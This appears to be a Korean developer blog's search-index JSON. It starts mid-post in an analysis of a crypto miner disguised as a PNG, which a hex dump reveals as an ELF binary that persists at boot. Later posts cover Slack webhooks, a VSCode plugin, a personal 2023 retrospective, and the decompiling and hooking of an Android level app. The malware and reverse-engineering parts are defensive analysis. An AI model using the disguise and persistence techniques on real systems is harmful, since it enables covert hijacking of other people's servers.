0100 0000 0400 0000 0000 0000 0000 0000 ................00000050: 0000 4000 0000 0000 0000 4000 0000 0000 ..@.......@.....00000060: b006 0000 0000 0000 b006 0000 0000 0000 ................00000070: 0010 0000 0000 0000 0100 0000 0500 0000 ................00000080: 0010 0000 0000 0000 0010 4000 0000 0000 ..........@.....00000090: 0010 4000 0000 0000 297f 4400 0000 0000 ..@.....).D.....root@test home % xxd siliconarmblueprints.png| head 00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000 .ELF............00000010: 0200 b700 0100 0000 0035 4000 0000 0000 .........5@.....00000020: 4000 0000 0000 0000 583d 4200 0000 0000 @.......X=B.....00000030: 0000 0000 4000 3800 0600 4000 1d00 1c00 ....@.8...@.....00000040: 0100 0000 0500 0000 0000 0000 0000 0000 ................00000050: 0000 4000 0000 0000 0000 4000 0000 0000 ..@.......@.....00000060: b408 4000 0000 0000 b408 4000 0000 0000 ..@.......@.....00000070: 0000 0100 0000 0000 0100 0000 0600 0000 ................00000080: 70fe 4000 0000 0000 70fe 8100 0000 0000 p.@.....p.......00000090: 70fe 8100 0000 0000 b83c 0100 0000 0000 p........&lt;......root@test home %파일 바이너리를 확인해보았다.파일 앞부분이 시스템 실행파일로 밝혀져 디컴파일하여 분석해보았다.*.png 파일 본격적으로 까보기Decompile *.png해당 파일을 디컴파일한 결과이다.암호화폐 소프트웨어 사용 부분해당 부분을 보면 암호화폐 채굴기에 대한 부분도 보인다.암호화폐 채굴하는 목적의 코드로 의심된다. 해당 스크립트가 성공적으로 통과될 시 부트 타임에 스크립트와 데몬을 끼워놓고 CPU 를 제어하고 사용자 모르게 암호화폐를 지속적으로 채굴하여 공격자에게 전송하는 목적이다.불특정다수의 서버가 채굴서버로 돌아갈 수 있음을 의미한다.정리하며우연찮게 서버에 찍힌 로그를 보고 호기심 반 걱정 반 분석해봤는데 해당 스크립트에 나온 부트 파일 및 데몬, 프로세스 영역 등 접근 가능하고 접근했을만한 부분을 다 탐색해봤다. 아직까진 발견된 이상증세/현상이 없지만 조금씩 더 살펴보고자 한다. 또한 이번 기회로 접근 부분 관련하여 보안을 강화하였다." }, { "title": "Slack 에 웹훅(webhook) 연결하기", "url": "/posts/gitlab-with-slack/", "categories": "develop, slack, gitlab", "tags": "develop, slack, gitlab", "date": "2024-01-04 00:00:00 +0900", "snippet": "Step by step협업을 하다보면 git 코멘트도 달고 MR 도 보내는데 해당 부분을 팀원에게 매번 알리는 걸 최소화하고자 팀원 슬랙에 웹훅을 연결하여 알림을 주는 식으로 바꾸면 어떨까한다.아래는 해당 웹훅을 연결하는 과정이다.웹훅을 연결하고자 하는 방에 앱 추가를 하여 위와 같은 앱을 검색해준다.다음으로 슬랙 앱 추가 후 채널을 선택하면 위와 같...", "content": "Step by step협업을 하다보면 git 코멘트도 달고 MR 도 보내는데 해당 부분을 팀원에게 매번 알리는 걸 최소화하고자 팀원 슬랙에 웹훅을 연결하여 알림을 주는 식으로 바꾸면 어떨까한다.아래는 해당 웹훅을 연결하는 과정이다.웹훅을 연결하고자 하는 방에 앱 추가를 하여 위와 같은 앱을 검색해준다.다음으로 슬랙 앱 추가 후 채널을 선택하면 위와 같은 url 이 나오는데 잘 메모해둔다.알림을 주고자하는 해당 Gitlab 저장소에 위와 같은 경로에 슬랙 알림 지정하는 곳이 있다.이전에 메모해둔 url 을 넣어준다.테스팅을 하면 슬랙 방에 알림이 오는 것을 볼 수 있다 !" }, { "title": "paste-image with VSCode for macOS", "url": "/posts/paste-image-vscode/", "categories": "blog", "tags": "blog, vscode, plugin", "date": "2024-01-02 00:00:00 +0900", "snippet": "Step by step티스토리나 네이버 등 사용하지 않고 블로그를 포스팅하다보면 번거롭고 복잡한 일들이 많다. 한 가지를 뽑자면 ‘사진 업로드’ 를 꼽을 수 있다. 다른 블로그들은 그냥 사진을 Drag &amp; Drop 하거나 갤러리를 열어서 사진을 업로드하는데 집주인 블로그는 그렇게 편하지는 않다. 블로그 사진 디렉터리에 사진을 넣어주고 포스팅하는...", "content": "Step by step티스토리나 네이버 등 사용하지 않고 블로그를 포스팅하다보면 번거롭고 복잡한 일들이 많다. 한 가지를 뽑자면 ‘사진 업로드’ 를 꼽을 수 있다. 다른 블로그들은 그냥 사진을 Drag &amp; Drop 하거나 갤러리를 열어서 사진을 업로드하는데 집주인 블로그는 그렇게 편하지는 않다. 블로그 사진 디렉터리에 사진을 넣어주고 포스팅하는 글에 알맞게 사진 위치와 사진 형식을 맞춰 작성해주고 정적 페이지에 사진을 업로드해야 블로그에서 사진을 이쁘게 볼 수 있다. 이 과정을 한번 정도는 나름 괜찮지만 여행 기록이나 연구 일지를 쓰려고 하다보면 자동화할 생각이 떠오른다. 그러던 중 더 좋은 아이디어로 블로그를 쓰다보면 이미지를 손쉽게 클립보드를 통해서 복사 붙여넣기 하는 프러그인을 찾게 되었다.기존에 우분투에서 사용하던 Paste-Image 플러그인을 사용했는데 macOS 에서 사용하면위와 같은 메세지가 출력된다.몇 차례 검색을 통해 확인해본 결과 macOS 에서 스크린샷을 클립보드로 저장하는 것과 파일로 저장하는 단축키가 다르다는 것을 확인하였다.해당 플러그인에서 일반적으로 Ctrl + Cmd + Shift + 4 가 클립보드를 사용하여 복사하는 것이고, Cmd + Option + V 가 해당 항목을 클립보드로부터 불러오는 붙여넣기이다우분투에서는 그냥 스크린샷한 내용을 Ctrl + Alt + V 하면 된다.플러그인 환경 변수 옵션추가적으로 해당 플러그인 확장 설정에서 사용하는 환경 변수에 대해서 확인해본 결과는 아래와 같다.Paste Image: Base PathThe base path of image url.You can use variable ${currentFileDir} and ${projectRoot}. ${currentFileDir} will be replace by the path of directory that contain current editing file. ${projectRoot} will be replace by path of the project opened in vscode. If you set basePath to empty String, it will insert absolute path to file.위에 대한 부분은 파일을 보여주는 image url 을 설정해준다.다음과 같이 예시를 들 수 있다.value: ${projectRoot}설정값이 프로젝트 루트 디렉터리인 경우 해당 위치를 기반으로 파일이 있는 곳을 상대경로로 표현한다.![](assets/img/sample.png)위와 같이 나타난다.Paste Image: PathThe destination to save image file.You can use variable ${currentFileDir} and ${projectRoot}. ${currentFileDir} will be replace by the path of directory that contain current editing file. ${projectRoot} will be replace by path of the project opened in vscode.위에 대한 부분은 파일이 저장되는 위치를 나타낸다.value: ${projectRoot}/assets/img설정값이 프로젝트 루트 디렉터리에서 assets/img 경우 해당 위치를 기반으로 파일이 있는 곳을 상대경로로 표현하여 저장한다.assets └── img └── sample.png파일을 복사하고 붙여넣으면 위와 같이 설정해준 경로에 파일이 생성되는 것을 확인할 수 있다.여기까지 필요한 환경 변수를 알아보았는데 다른 환경 변수도 요긴하게 사용할 수 있으니 확인해보면 사용하는데 편리할 거 같다.Referencehttps://github.com/mushanshitiancai/vscode-paste-image/issues/76#issuecomment-1254818499" }, { "title": "2023년 회고", "url": "/posts/2023-memory/", "categories": "research, develop, diary", "tags": "research, develop, diary", "date": "2023-12-31 00:00:00 +0900", "snippet": "2023 회고를 들어가며1년은 길게 느껴지기도 하면서 또 빨리 가는 느낌이 든다. 여러가지 일들이 있으면 느리게 가는 거 같지만 일상을 보내며 시간에 녹아드는데 정신을 차려보면 연말 겨울을 보고 있다. 시간을 돌아보면 당시엔 버겁지만 과거를 회상할 때 꽤 추억이 되는 몇몇 이야기가 있다.개인 공부 대신 회사 업무 연장으로 개인적으로 계속 삽질도 해보고...", "content": "2023 회고를 들어가며1년은 길게 느껴지기도 하면서 또 빨리 가는 느낌이 든다. 여러가지 일들이 있으면 느리게 가는 거 같지만 일상을 보내며 시간에 녹아드는데 정신을 차려보면 연말 겨울을 보고 있다. 시간을 돌아보면 당시엔 버겁지만 과거를 회상할 때 꽤 추억이 되는 몇몇 이야기가 있다.개인 공부 대신 회사 업무 연장으로 개인적으로 계속 삽질도 해보고 뚝딱뚝딱거리면서 연구도 했었다. 처음 배우는 기술이나 생소한 기법등을 이해하고 내 것으로 만들고자 꽤 시간을 투자했었다. 프로젝트를 시작할 때 단지 개발만 하는 게 아니라 정확히 목표지점까지 해당 로드맵에서 쓸 수 있는 자원들을 가져다가 어떻게 사용할 수 있는지 분석, 파악한 다음 각 기능을 모듈화하여 최대한의 리소스를 뽑아내는 모습을 보았다.‘이렇게도 개발할 수 있구나’, ‘이런 방식으로도 구현이 가능하구나’ 하는 경이로운 모습들이 기억나기에 혼자 따라해보면서 뚝딱뚝딱 진행했다.먼저 2023년 회고는 대망의 일일커밋 으로 시작해보려고 한다.정원사2023 잔디밭위 사진은 일일커밋으로 지난 시간을 보면서 나의 1년은 어떠헀는지 돌아보았다.예전처럼 커밋을 자주 할 수 없어 리팩토링이나 문서 작업 등을 커밋하곤 하는데 그래도 코드 보는 습관을 놓지 않으려고 한다. 주말에도 가볍게 코드를 보려고 노력했는데 퇴근 후에는 시간이 적고 주말에는 시간이 많아서 잘게 조금씩 할 수 있는 것들은 주중에 진행하고 오랜 시간 투자해야 하거나 집중이 필요한 것들은 주말에 진행하였다.최근에는 오픈소스로 공개된 다양한 코드들을 구경하면서 어떻게 구성되어 어떻게 작동되는지 살펴보는 시간을 가지고 있다. 오픈소스를 보면 굉장한 프로젝트도 많고 유별나게 신기한 프로젝트도 많이 만나볼 수 있다.사람이 코드를 짜는 부분이라 그런지 코드에는 그 사람의 색깔이 묻어나있어 패턴이나 방식, 접근 방향 등등을 접할 수 있다.현재 있는 오픈소스 프로젝트에서도 기능을 만들 때 처음부터 만들지 않고 원하는 기능이나 구조가 오픈소스로 있는지 먼저 확인한다. 그리고 그러한 것들을 메인 아키텍쳐와 잘 엮어주는 역할을 수행했다.1분기 회고다음은 지난 1분기 개발 회고이다.가장 힘든 시기이기도 하고 아마 이 일을 커리어로 하면서 앞으로 이런 특이 케이스의 일을 해결할 일이 있을까 하는 생각이 많이 들었다.쉽지 않은 1분기였지만 지나고보면 진짜 배운 것도 많고 짧은 시간에 얻어가는 것도 많았다.1분기 때 속성으로 얻은 것들을 토대로 남은 2, 3, 4분기를 유익하게 보낼 수 있었던 거 같다.봄 가득한 사진들집 근처 초등학교 어느 벚꽃퇴근 후 벚꽃 구경을 갔는데 팝콘처럼 만개하였다.이때 제대로 벚꽃 구경을 못 했는데 기회가 된다면 나중에 다시 제대로 해보고 싶다.한강, 자리 찾기 너무 힘든..퇴근 후 한강 갔는데 날씨도 좋았다. 선선해서 먹을거리를 사서 즐겼는데 밤에 좀 추워져서 늦지 않게 정리하고 왔다.카페도 이쁘고 빵이랑 음료도 굉장히 좋은상반기 초반에 제주도 놀러갔을 때인데 걸어가다 마주한 카페에 들어갔다.음료와 빵이 있어서 하나씩 구매했는데 비쥬얼이 좋았다.걸어다니면서 거리를 보는 게 좋고 꽤 괜찮은 시간이었다.한강 이곳저곳 걸어다녔는데 마침 이때 무지개도 볼 수 있었다.정말 날씨 좋을때 한번 쭉 걸으면 힐링도 하고 생각도 환기할 수 있어서 좋다.야경퇴근 후 바라본 한강, 멍 때리면서 봤던 거 같다.밤 멍오랜만에 따뜻한 봄이어서 많이 밖에도 다니고 사진도 남겼었다.2분기 회고2분기 때는 이미 만들어진 코드를 보면서 왜 이렇게 작성했는지 개발자의 의도와 코드를 이해하는데 시간을 많이 투자했다.1분기 때 얻은 센스를 바탕으로 여러가지 코드를 더 면밀하게 볼 수 있었다.대다수의 코드가 첫 작성자가 아니면 이해하기 어려운데 코드라는게 변수 이름과 흐름도만 난잡하게 섞이는거지 그걸 따라가면 결국 똑같이 보이는거 같다.더 나아가 괜찮은 로직은 마이그레이션과 컨버팅 작업으로 원하는 모듈로 만들어 볼 수 있었다.이때 새로운 대규모 스터디에 참가했는데 역시 시작이 중요하다구,, 한번 빠지니까 계속 빠지게 되었다. 올해는 잘 참석해보려고 한다. 이론부터 실전까지 로우레벨 코드를 리뷰하는 과정을 거치고 있다.언젠가 또 다가올 날을 대비해서 여러가지 툴과 기술들을 익혀보려고 한다. 사실 툴은 조금씩 익혀보고 실전을 여러가지 해보면 다양한 사례에 대해 대응이 가능할 것으로 보인다.3분기 회고다음은 3분기 개발 회고이다.퇴근 후 시간과 주말에는 항상 연구/분석을 했었다.개밥먹기와 비슷한데 내가 만든 자동차에 직접 시승해서 운행을 해보기도 했다.또 다른 사람들이 만든 차를 직접 시승해서 어떠한지 찾아보기도 했다. 개인적으로 신박했던 것은 고의적으로 내부에 부품 결함을 만들고 운행할 때 해당 결함이 어떻게 어떤 모습으로 발견되는지 확인하면서 결함을 좀 더 빠르고 정확하게 찾는 과정을 가졌다.그리고 연구하고 개발한 성과가 결과적으로 독보적인 알고리즘으로 인정 받을 수 있었다.그리고 블로그를 현재 블로그로 이사했다. 이전 블로그는 취준 때 급하게 만들어서 기술블로그가 아닌 구닥다리 느낌이 컸는데 이번에 리뉴얼하면서 완전 다른 모습으로 바꿨다.지금도 해당 블로그를 잘 바꿔놔서 그런지 포스트를 꾸준하게 작성하고 있다. 그래도 조금씩 필요한 부분을 더 만들고 추가하고 있다.4분기 회고Open-smartwatch다음은 오픈소스 여행 회고이다.참여하고 있는 오픈소스 프로젝트에서 알게 된 메인테이너 집에서 하룻밤을 묵게 되었다.4분가에는 꽤 다양한 코드를 보고 이해하려고 한 시간이 많았다. 이미 만들어진 코드를 기반으로 원하는 목적으로 바꾸거나 기존 코드에서 어떤 문제가 있는지 확인하는 등 작업을 주로 해왔다.프로젝트를 진행하면서 느낀 게 참 다양한 사람들이 있고 메인테이너는 누구나 개발하고 누구나 경험할 수 있게 그들을 다 포용하려는 의견이다.누구나 우리가 만든 소프트웨어를 사용할 수 있고 제약없이 경험해볼 수 있게 하기 위해 올해는 전면 개편하고 프로젝트 추후 목표와 가상화 작업에 매진했다. 비록 기성 제품을 따라잡기엔 어렵겠지만 천천히 걸어나가고자 한다.어느덧 1년이 지나간다. 1년을 돌아보면 단순히 개발을 하는 게 아니라 왜 이렇게 코드를 작성하는지에 중점을 두고 기능을 구현하다보니 치명적인 결함들이 낮은 확률로 가용성을 해칠 수 있다는 결과를 얻게 되었다.추가된 부품이 동작하는 것은 문제가 없지만 이 부품이 동작하기 위해서 자동차의 운행 기능에 지장이 있으면 그것은 더 큰 문제로 이어질 수 있다.한가지 예시로 에어컨 기능을 장착했는데 에어컨을 작동시키기 위해서 잠시 브레이크를 사용할 수 없다고 생각해보자 생각만 해봐도 아찔하지 않을까 우린 아마도 한 여름에 더위를 식히기 위해서 도로 위에서 공포를 체험하거나 더위를 삼키면서 운행을 해야할지도 모른다.기능 퀄리티가 조금 떨어지더라도 기능이 불러오는 사고를 최소화하기 위해 자동차의 운행 기능과 완전히 격리시켜서 동작하게 만들었다.이를 통해 소프트웨어 품질 검사에서도 최고 성적을 거둘 수 있었다.다른 의미의 출발들처음 이 과정을 수강한다고 했을 때 ‘어떻게 할 수 있을까’ 했는데 결국 잘 수료헀다. 매순간 어려움이 있었고 망설임도 있었다.작년에는 주중이라 불금을 반납했는데 다행스럽게 이번엔 토욜이라 불금을 챙길 수 있었다. 그러나 내 주말은 사라졌다..계기야 어떻든 한번 더 사람들을 이해하고 바라볼 수 있는 시각을 넓혀주었다.Goob Bye !12년간 함께했던 공동체를 떠난다.결정하기 어려웠지만 결정 앞에서 단단해지는 과정을 배우는 거라고 생각한다.너무 좋은 사람들이 많았고 뒤늦게 사람들과 그간 이야기를 털어놓다보니 아쉬운 마음과 동시에 결정을 철회할까 생각도 들었는데 그러지 않았다.인생에 집이라고 해도 과언이 아니다. 집의 완성은 울타리 안에서 성장하고 독립해서 끝에는 밖으로 나가는 게 완성이라고 생각한다.따뜻한 말씀 감사합니다, 감사히 살아가겠습니다.k5a2023년, 끝나갈 때 가장 많은 변화를 준 한 페이지다.원하지 않을 때 주고 원할 때 다시 거두어 가는 이상한 이론이 있다.개인적으로 친하다고 생각하는 동생이랑 만나기로 약속을 잡았다. 그때가 하필 상상도 못한 한파여서 단단히 준비하고 나가서 그런지 생각보다 안 추웠다. 근데 손이 정말 부서질 것처럼 바람이 너무 심했던 걸로 기억한다.퇴근 후 만나는 걸로 역에서 먼저 와서 기다리는데 갑자기 옆에서 누군가 인생상담을 요청하여서 열심히 들어줬는데 알고보니 신종 사이비였다. 지금 이 글을 쓰면서 생각해보니 이전에 관련하여 개인적으로 연구를 했던 부분이 있다. 사이비들도 이용하는 쇼핑몰이나 커뮤니티가 있을텐데 해당 커뮤니티가 사람들을 어떻게 잡아두는지 궁금하여 기술적으로 분석하고 연구했었다.근데 아무튼 공대생에서 상담을 요청하다니.. 지금 생각해도 뭔가 이상하게 많이 잘못된거다.아무튼 이때 이 친구와 같이 가고 싶은 음식점이 있었는데 리뷰를 보니 영업시간이 랜덤이라는 걸 보고 살짝 불안했다. 근데 직감은 맞았고 우리는 다른 곳을 찾아 가야했다. 많이 아쉬웠지만 다음 기회라는 게 있을테니 흔쾌히 다른 곳을 가보고자 했다. 정말 대부분 술집이어서 밥집이 있을까 했는데 다행히 쉽게 찾을 수 있었지만 역에서 10분 정도 걸어올라간 기억이다.이때 밥 먹고 카페 문 닫을 때까지 쉬지 않고 얘기했는데 대화를 하면서 혼자 재미있을 거 같은 따분한 토픽으로 계속 대화헀는데 의외로 호기심 가득한 얼굴로 들어줘서 감사했다. 맑눈광.. 아니 초롱초롱한 눈망울을 가진 사람과 쉬지 않고 이야기를 했다. 뭔가 같은 가치관을 두고 시간 가는줄 모르고 얘기를 했는데 굉장히 행복했고 알아가는게 많았다.23살 기준으로 꽤 많은 변화가 있었다. 연애를 하고 공부를 하고 여행을 다녀보니 내 삶에 가치관이나 중심이 좀 많이 달라지는 기분이 든다. 이러한 것을 이 친구에게 많이 느끼곤 했다. 항상 좋은 사람은 곁에 오래 있지 않는 것 같다. 그래서 대화를 하면서도 아쉬움이 많이 느껴지곤 했다. 대화를 하다보면 비슷한 1년을 보낸거 같아 너무 흥미로운 얘기가 많았고 동시에 마음이 아픈 부분도 있었다. 정말 과장 없이 궁금한 걸 많이 물어봐주어 혼자 얘기한 시간만 엄청 길었던 거 같은데 너무 미안함이 남아 다음엔 먼저 선수 치는 것과 동시에 질문공세를 해보려고 한다.12월 24일, 이때 원래 집에 바로 갈 생각이었지만 친한 동생이 저녁 먹으러 간다고 해서 잠시 정적이 흐르다가 같이 먹겠냐고 물어봐줬다. 흔하게 있는 기회가 아니어서 고민 끝에 저녁만 먹고 가기로 했다. 근데 어쩌다보니 카페가서 얘기하면서 시간 가는 줄 모르게 예기했다.카페에서 나와 집으로 가려고 시간을 보다가 날짜를 보니 12/24 이었다. 의미를 부여하지 않지만 가까운 사람들과 특별한 날을 보낸다면 그게 가장 좋은게 아닐까 싶다.좀 돌아가지만 풍경을 볼 수 있습니다.2023년을 잊지 않으려고 정확히 말하면 그때 어떤 일들 때문에 힘들었고 그렇지만 어떻게 그 고비를 넘으면서 웃을 수 있었는지 키워드로 적어놓고 기록했는데 지난 한 해 돌아보며 회고를 쓰다보니 기술적인 성장과 더불어 여러 배움이 많았다.개인 공부보다는 회사 업무 연장으로 개인적으로 이것저것 연구하고 개발해본 시간을 가졌다. 꽤 재미난 주제로 연구를 했던 소재가 몇개 있어서 관련해서 확장이나 개발 환경을 위한 향상 또는 다른 프레임워크와의 호환성 등등 여러가지 개발을 해보았다. 주말마다 팀 공부나 프로젝트 코드리뷰를 하는 걸 제외하곤 대부분 회사 업무와 더불어 다양한 시도를 해보았다.처음 계획과는 다르지만 그래도 여러가지 경험도 하고 좋은 인연도 만나볼 수 있었다. 가는 방향이 어떻든 가는 길에 더 많은 걸 볼 수 있고 의도치 않은 여정 속에서 더 가치 있는 걸 발견하는게 나쁘지 않은 거 같다.올해 2024년은 정말 밀고 미루던 것들을 하나씩 제대로 하려고 한다. 참여하고 있던 장기 프로젝트도 다시 열심히 듣고 미진한 부분도 진득하게 공부해가려고 한다.꽤 늦은 회고라고 할 수 있지만 마켓에서 상품이 팔리면 하루나 늦으면 일주일 뒤에까지 환불이나 교환을 접수한다 이처럼 지난 1년을 보내고 되돌아보면서 괜찮았는지 확인해보기에 충분한 시간이 필요했다.마지막으로 이 글을 계속 언제 쓰냐고 재촉해주신 친한 동생분께 감사를 전한다." }, { "title": "하드웨어 센서 값을 가공하는 방법", "url": "/posts/research-gyro-app/", "categories": "research-diary", "tags": "research-diary", "date": "2023-11-25 00:00:00 +0900", "snippet": "들어가며내년부터 새로운 프로젝트에 참가하는데 하드웨어쪽 코드를 살펴볼 필요가 있어서 예전에 잠깐 가지고 놀았던 아두이노가 생각났다. 블루투스나 여러 통신 모듈 및 센서 모듈로 IOT 환경을 만들 수 있었는데 이번엔 좀 다른게 모바일과 웹 기반으로 위와 같은 기능을 구현할 예정이다.생각해보면 일상속에 많은 하드웨어들이 소프트웨어화가 되면서 사람들의 주머...", "content": "들어가며내년부터 새로운 프로젝트에 참가하는데 하드웨어쪽 코드를 살펴볼 필요가 있어서 예전에 잠깐 가지고 놀았던 아두이노가 생각났다. 블루투스나 여러 통신 모듈 및 센서 모듈로 IOT 환경을 만들 수 있었는데 이번엔 좀 다른게 모바일과 웹 기반으로 위와 같은 기능을 구현할 예정이다.생각해보면 일상속에 많은 하드웨어들이 소프트웨어화가 되면서 사람들의 주머니는 가벼워진거 같다. 가장 큰 요소가 카메라와 컴퓨터이다. 예전에는 디지털 카메라를 항상 휴대하거나 컴퓨터를 통해서 검색할 수 있었는데 요즘은 너무 잘 발달된 어플리케이션 덕분에 걸어다니면서 전기 없이 간편하게 순간을 기억할 수 있도록 소장하거나 다른 사람들에게 손쉽게 공유가 가능하다.많은 센서들 가운데 균형 센서 이용할 계획을 가지고 있었다. 손목시계와 휴대전화에 공통으로 균형센서가 있어 이를 응용해볼까 한다. 최근 여행 다녀오면서 기내에서는 느껴지지 않지만 비행기가 조금씩 기울어질때 수평이 궁금해서 level 앱을 사용한 일을 떠올렸다. 당시에 휴대전화가 비행기 머리와 같이 평행해서 놓고 확인했을때 Y 축은 부드럽게 수평 균형을 감지하는 것을 확인할 수 있었다. 약간의 기울임이 조금씩 발생했지만 그렇게 느껴지지는 않았다.이번에는 level 앱에서 어떻게 Gyro 센서 값을 사용하고 사람이 보기 쉽게 보여주는지 확인하고자 한다. 아래는 해당 level 앱에 있는 메니페스트를 살펴보았다.&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;manifest android:compileSdkVersion=\"33\" android:compileSdkVersionCodename=\"13\" android:installLocation=\"auto\" android:versionCode=\"46\" android:versionName=\"1.2.11\" package=\"level.sample.app\" platformBuildVersionCode=\"33\" platformBuildVersionName=\"13\" xmlns:android=\"http://schemas.android.com/apk/res/android\"&gt; &lt;uses-sdk android:minSdkVersion=\"21\" android:targetSdkVersion=\"33\"/&gt;해당 부분에서 빌드 버전 네임 등 고유 속성을 확인할 수 있다. &lt;uses-feature android:name=\"android.hardware.sensor.compass\" android:required=\"false\"/&gt; &lt;uses-feature android:name=\"android.hardware.sensor.accelerometer\"/&gt; &lt;uses-feature android:name=\"android.hardware.touchscreen\" android:required=\"false\"/&gt; &lt;uses-feature android:name=\"android.hardware.screen.landscape\" android:required=\"false\"/&gt; &lt;uses-permission android:name=\"android.permission.VIBRATE\"/&gt; &lt;uses-permission android:name=\"android.permission.INTERNET\"/&gt; &lt;uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\"/&gt; &lt;supports-screens android:anyDensity=\"true\" android:largeScreens=\"true\" android:normalScreens=\"true\" android:resizeable=\"true\" android:smallScreens=\"true\" android:xlargeScreens=\"true\"/&gt;해당 부분에서 하드웨어 센서에 접근하는 권한을 확인할 수 있다.위를 참고하면 메니페스트에서 해당 앱이 사용하는 하드웨어 기능과 빌드 속성을 간략히 확인할 수 있다.센서 값을 calibration 하는 기능먼저 아래 사진에서 보이는 센서 값 보정하는 부분 코드를 찾아보려고 한다.아래와 같은 함수에서 calibration 을 터치했을 때 동작을 제어한다.@Override // android.view.View$OnTouchListenerpublic final boolean onTouch(View view0, MotionEvent motionEvent0) { String s1; float f5; float f2; DecimalFormat decimalFormat0; StringBuilder stringBuilder0; Context context0; String s; int v = motionEvent0.getAction(); float f = motionEvent0.getX(); float f1 = motionEvent0.getY(); if((SmartLevel.z) &amp;&amp; ((f &gt; ((float)this.A) - this.F - ((float)this.m.getWidth()))) &amp;&amp; (((f1 &gt; ((float)this.B) - this.G - this.F * 1.5f - ((float)this.m.getHeight()) - this.E * 0.5f)) &amp;&amp; ((f1 &lt; ((float)this.B) - this.G - this.E * 0.5f)))) { if(v == 0) { if(SmartLevel.A) { q q0 = this.f; if(q0 != null) { q0.g(0); } } if(this.a) { boolean z = SmartLevel.s; s = \" (Y=\"; if((z) &amp;&amp; !this.w) { SmartLevel.s(-this.i + SmartLevel.E); context0 = this.e; stringBuilder0 = new StringBuilder(); stringBuilder0.append(this.e.getString(0x7F1100D0)); // string:roll_zero_ok \"Success! set to zero\" stringBuilder0.append(s); decimalFormat0 = v.a; goto label_79; } if(!z &amp;&amp; (this.w)) { SmartLevel.s(this.i + SmartLevel.E); context0 = this.e; stringBuilder0 = new StringBuilder(); stringBuilder0.append(this.e.getString(0x7F1100D0)); // string:roll_zero_ok \"Success! set to zero\" stringBuilder0.append(s); decimalFormat0 = v.a; goto label_79; } SmartLevel.r(-this.i + SmartLevel.F); context0 = this.e; stringBuilder0 = new StringBuilder(); goto label_38; } else { s = \" (X=\"; if(this.b) { boolean z1 = SmartLevel.s; if((z1) &amp;&amp; !this.w) { SmartLevel.r(-this.g + SmartLevel.F); context0 = this.e; stringBuilder0 = new StringBuilder(); goto label_38; } if(!z1 &amp;&amp; (this.w)) { SmartLevel.r(this.g + SmartLevel.F); context0 = this.e; stringBuilder0 = new StringBuilder(); label_38: stringBuilder0.append(this.e.getString(0x7F1100D0)); // string:roll_zero_ok \"Success! set to zero\" stringBuilder0.append(s); decimalFormat0 = v.a; f2 = SmartLevel.F; goto label_80; } SmartLevel.s(this.g + SmartLevel.E); context0 = this.e; stringBuilder0 = new StringBuilder(); stringBuilder0.append(this.e.getString(0x7F1100D0)); // string:roll_zero_ok \"Success! set to zero\" stringBuilder0.append(s); decimalFormat0 = v.a; goto label_79; } float f3 = this.i; if(((f3 &lt; 60.0f)) &amp;&amp; ((f3 &gt; -60.0f))) { float f4 = this.g; if(!(f4 &lt; 60.0f) || !(f4 &gt; -60.0f)) { context0 = this.e; s1 = context0.getString(0x7F1100A3); // string:nolie_msg \"After putting the device on a level surface, tap Zero calibration.\" v.j(context0, s1, this); return true; } boolean z2 = SmartLevel.s; if((z2) &amp;&amp; !this.w) { SmartLevel.s(-f3 + SmartLevel.E); f5 = -this.g; } else if(!z2 &amp;&amp; (this.w)) { SmartLevel.s(f3 + SmartLevel.E); f5 = this.g; } else { SmartLevel.s(f4 + SmartLevel.E); f5 = -this.i; } SmartLevel.r(f5 + SmartLevel.F); this.i = SmartLevel.E; this.g = SmartLevel.F; this.postInvalidate(); context0 = this.e; stringBuilder0 = new StringBuilder(); stringBuilder0.append(this.e.getString(0x7F1100D0)); // string:roll_zero_ok \"Success! set to zero\" stringBuilder0.append(\" (X=\"); decimalFormat0 = v.a; stringBuilder0.append(\"0.0\"); stringBuilder0.append(\"˚, Y=\"); label_79: f2 = SmartLevel.E; label_80: stringBuilder0.append(decimalFormat0.format(((double)f2))); stringBuilder0.append(\"˚)\"); s1 = stringBuilder0.toString(); v.j(context0, s1, this); return true; } context0 = this.e; s1 = context0.getString(0x7F1100A3); // string:nolie_msg \"After putting the device on a level surface, tap Zero calibration.\" } v.j(context0, s1, this); } return true; } if(v == 0) { this.l = true; return true; } if(v != 1 &amp;&amp; (!this.l || v != 3)) { return true; } this.l = false; return true;}위에서 v.j() 함수로 리셋 결과가 넘어간다.아래는 전달한 매개변수가 진입하는 함수다.public static void j(Context context0, String s, View view0) { try { if(NotificationManagerCompat.from(context0).areNotificationsEnabled()) { Toast.makeText(context0, s, 0).show(); } else { Snackbar.make(view0, s.replace(\"\\n\", \" \"), -1).show(); } } catch(RuntimeException runtimeException0) { goto label_13; } if(Build.VERSION.SDK_INT &lt; 26) { goto label_7; } try { ((Vibrator)context0.getSystemService(\"vibrator\")).vibrate(b.i(16L)); return; label_7: ((Vibrator)context0.getSystemService(\"vibrator\")).vibrate(16L); return; } catch(RuntimeException runtimeException1) { } try { runtimeException1.printStackTrace(); return; } catch(RuntimeException runtimeException0) { } label_13: runtimeException0.printStackTrace(); }아래에서 실제로 해당 코드에서 초기화가 일어나는지 결과를 확인해본다.[+] Logger level.sample.app.v.j(context0, s, view0) param=Reset calibration (X=0.0˚, Y=0.0˚)[+] Logger level.sample.app.v.j(context0, s, view0) result=undefined[+] Logger level.sample.app.v.j(context0, s, view0) param=Reset calibration (X=0.0˚, Y=0.0˚)[+] Logger level.sample.app.v.j(context0, s, view0) result=undefined[+] Logger level.sample.app.v.j(context0, s, view0) param=Reset calibration (X=0.0˚, Y=0.0˚)[+] Logger level.sample.app.v.j(context0, s, view0) result=undefined[+] Logger level.sample.app.v.j(context0, s, view0) param=Reset calibration (X=0.0˚, Y=0.0˚)[+] Logger level.sample.app.v.j(context0, s, view0) result=undefined[+] Logger level.sample.app.v.j(context0, s, view0) param=Reset calibration (X=0.0˚, Y=0.0˚)[+] Logger level.sample.app.v.j(context0, s, view0) result=undefined위와 같이 해당 부분을 통해 따라가면 센서 값을 초기화하는 것을 볼 수 있다.X, Y 를 구해서 화면에 출력하기다음은 센서 값을 화면에 출력하는 부분을 찾아볼 것이다.final class i implements SensorEventListener { float[] a; float b; float c; a[] d; final j e; i(j j0) { this.e = j0; super(); this.a = new float[3]; this.b = 0.0f; this.c = 0.0f; this.d = new a[]{new a(), new a()}; } @Override // android.hardware.SensorEventListener public final void onAccuracyChanged(Sensor sensor0, int v) { } @Override // android.hardware.SensorEventListener public final void 